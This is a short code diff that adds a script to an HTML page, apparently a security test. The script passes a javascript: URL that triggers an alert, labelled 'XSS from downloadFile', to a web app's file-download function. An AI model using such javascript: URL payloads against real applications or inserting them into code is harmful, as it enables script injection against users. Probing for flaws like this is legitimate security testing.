@@ -11,3 +11,10 @@ window.parent.postMessage(
   "https://mr1609.web-test.oneme.ru"
 );
 </script>
+<script>
+WebApp.downloadFile({
+  url: "javascript:alert('XSS from downloadFile')",
+  name: "xss.html"
+});
+</script>
+
